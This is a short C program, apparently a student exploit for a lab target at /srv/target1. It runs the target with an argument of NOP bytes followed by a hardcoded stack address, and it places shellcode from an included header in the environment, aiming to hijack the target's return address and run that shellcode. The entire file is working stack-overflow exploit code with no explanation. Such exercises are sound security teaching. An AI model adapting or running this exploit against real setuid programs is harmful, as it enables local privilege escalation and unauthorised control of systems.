#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void)
{
    char *args[3];
    char *env[2];

    args[0] = TARGET;
    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf4\xd3\xff\xff";
    args[2] = NULL;

    env[0] = shellcode;
    env[1] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}